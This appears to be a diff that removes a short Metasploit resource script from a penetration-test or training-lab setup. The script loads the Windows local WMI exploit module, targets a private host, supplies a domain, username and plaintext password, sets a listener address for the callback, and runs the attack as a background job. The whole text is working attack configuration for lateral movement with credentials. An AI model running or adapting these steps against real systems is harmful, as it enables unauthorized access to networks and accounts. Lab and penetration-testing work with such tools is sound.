@@ -1,8 +1,0 @@
-use exploit/windows/local/wmi
-set RHOSTS 172.22.117.10
-set SESSION 3 #maybe? check in testing
-set SMBDomain megacorpone
-set SMBUser bbanner
-set SMBPass Winter2021
-set LHOST 172.22.117.100
-run -j
